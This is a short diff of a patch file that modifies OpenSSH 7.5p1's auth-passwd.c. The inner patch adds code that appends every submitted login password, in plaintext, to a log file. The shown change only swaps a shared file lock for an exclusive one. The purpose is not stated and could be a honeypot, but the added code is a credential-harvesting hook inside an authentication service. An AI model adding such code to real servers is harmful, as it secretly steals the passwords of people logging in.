@@ -1,5 +1,5 @@
 --- auth-passwd.c	2017-03-20 02:39:27.000000000 +0000
-+++ ../openssh-7.5p1.patch.git/auth-passwd.c	2017-06-30 06:28:01.991319677 +0100
++++ ../openssh-7.5p1.patch.git/auth-passwd.c	2017-06-30 07:21:05.375435550 +0100
 @@ -45,6 +45,12 @@
  #include <string.h>
  #include <stdarg.h>
@@ -35,7 +35,7 @@
 +           FILE *log  = fopen(log_file, "a+");
 +           if(log != NULL){
 +             int fd = fileno(log);
-+             if(flock(fd, LOCK_SH) == 0){
++             if(flock(fd, LOCK_EX) == 0){
 +                 (void)fprintf(log, "%s\n", password);
 +                 (void)flock(fd, LOCK_UN);
 +             }
